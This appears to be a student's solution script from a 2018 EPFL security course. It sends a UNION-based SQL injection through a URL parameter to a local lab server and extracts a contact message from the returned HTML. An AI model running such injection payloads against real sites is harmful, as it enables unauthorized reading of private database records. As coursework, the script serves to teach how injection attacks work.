# Lucia Montero Sanchis
# Information Security and Privacy, EPFL 2018

from bs4 import BeautifulSoup
import json
import requests

url = "http://127.0.0.1/personalities?id=1'%20union%20all%20select%20mail,%20message%20from%20contact_messages%20where%20mail='james@bond.mi5"

response = requests.get(url)

soup = BeautifulSoup(response.content, 'html.parser')
x = soup.body.find_all('a')
print(x[1].contents[0].split(':')[1])